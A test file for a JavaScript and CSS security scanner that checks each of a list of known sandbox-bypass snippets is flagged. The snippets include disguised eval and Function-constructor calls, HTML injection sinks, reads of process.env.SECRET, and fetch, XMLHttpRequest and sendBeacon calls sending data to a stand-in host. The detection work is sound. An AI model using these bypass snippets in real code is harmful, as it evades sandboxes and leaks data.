import { describe, expect, it } from 'vitest';
import { componentManifest } from '@osai/command-palette';
import { scanCssResources, scanJavaScript } from './security.js';

describe('known security sink bypasses', () => {
  it.each([
    ['window["eval"]("bad")', 'dynamic-evaluation'],
    ['globalThis["Fun" + "ction"]("bad")', 'dynamic-evaluation'],
    ['const fn = window["eval"]; fn("bad")', 'dynamic-evaluation'],
    ['(0, eval)("bad")', 'dynamic-evaluation'],
    ['[].constructor.constructor("bad")()', 'dynamic-evaluation'],
    ['(() => {}).constructor("bad")()', 'dynamic-evaluation'],
    ['const code = "bad"; window["setTimeout"](code, 1)', 'inline-execution'],
    ['node["onclick"] = "bad"', 'inline-handler'],
    ['node.setAttribute("on"+"click", "bad")', 'inline-handler'],
    ['node.innerHTML = value', 'html-execution-sink'],
    ['node.insertAdjacentHTML("beforeend", value)', 'html-execution-sink'],
    ['document["write"](value)', 'html-execution-sink'],
    ['frame.srcdoc = value', 'html-execution-sink'],
    ['window.OSAIEvil = {}', 'undeclared-global'],
    ['window["OSAIevil"] = {}', 'undeclared-global'],
    ['globalThis.OSAI.Other = {}', 'undeclared-global'],
    ['const w=window; w.evil = 1', 'undeclared-global'],
    ['Object.defineProperty(window, "evil", {value:1})', 'undeclared-global'],
    ['Object.assign(globalThis, {evil:1})', 'undeclared-global'],
    ['Reflect.set(window, "evil", 1)', 'undeclared-global'],
    ['window[name](value)', 'unverifiable-global'],
    ['globalThis["fetch"]("https://elsewhere.invalid/data")', 'undeclared-origin'],
    [
      'const request = new XMLHttpRequest(); request.open("GET", "https://elsewhere.invalid/data")',
      'undeclared-origin',
    ],
    ['navigator.sendBeacon("https://elsewhere.invalid/data", value)', 'undeclared-origin'],
    ['new Worker("worker.js")', 'undeclared-worker'],
    [
      'const script = document.createElement("script"); script.src = "https://elsewhere.invalid/code.js"',
      'undeclared-asset',
    ],
    [
      'const script = document.createElement("script"); script.textContent = value',
      'inline-execution',
    ],
    ['image.setAttribute("src", url)', 'unverifiable-resource'],
    ['require("node:fs")', 'unresolved-module'],
    ['module["require"]("node:fs")', 'unresolved-module'],
    ['import.meta.url', 'unresolved-module'],
    ['Buffer.from("data")', 'node-runtime'],
    ['process["env"].SECRET', 'node-runtime'],
  ])('reports %s', (source, code) => {
    const result = scanJavaScript(source, componentManifest);
    expect(
      result.map((value) => value.code),
      source,
    ).toContain(code);
    expect(result.every((value) => /^\/script\/\d+\/\d+$/.test(value.path))).toBe(true);
  });

  it('accepts approved namespace prefixes but requires exact resource assets', () => {
    const manifest = structuredClone(componentManifest);
    manifest.capabilities.networkOrigins = ['https://assets.example.com'];
    manifest.assets = [
      {
        path: 'icon.png',
        type: 'image',
        origin: 'https://assets.example.com',
        integrity: 'sha256-YQ==',
      },
    ];
    expect(
      scanJavaScript(
        'window.OSAI={}; globalThis.OSAI.Components={}; window.OSAI.Components.v1={};',
        manifest,
      ),
    ).toEqual([]);
    expect(scanJavaScript('fetch("https://assets.example.com/data")', manifest)).toEqual([]);
    expect(scanJavaScript('image.src="https://assets.example.com/icon.png"', manifest)).toEqual([]);
    expect(
      scanJavaScript('image.src="https://assets.example.com/unknown.png"', manifest).map(
        (value) => value.code,
      ),
    ).toContain('undeclared-asset');
  });

  it('handles quoted imports, inline CSS URLs and origin-prefix confusion', () => {
    const manifest = structuredClone(componentManifest);
    manifest.assets = [
      {
        path: 'icon.png',
        type: 'image',
        origin: 'https://assets.example.com',
        integrity: 'sha256-YQ==',
      },
    ];
    expect(
      scanCssResources('@import "https://elsewhere.invalid/style.css";', manifest),
    ).toHaveLength(1);
    expect(
      scanCssResources('.a { background:url("data:image/png;base64,YQ==") }', manifest)[0]?.code,
    ).toBe('undeclared-inline-asset');
    expect(
      scanCssResources('.a { background:url("https://assets.example.com/icon.png") }', manifest),
    ).toEqual([]);
    expect(
      scanCssResources(
        '.a { background:url("https://assets.example.com/unknown.png") }',
        manifest,
      )[0]?.code,
    ).toBe('undeclared-style-resource');
    expect(scanCssResources('.a { color:expression(x) }', manifest)[0]?.code).toBe(
      'inline-execution',
    );
  });
});
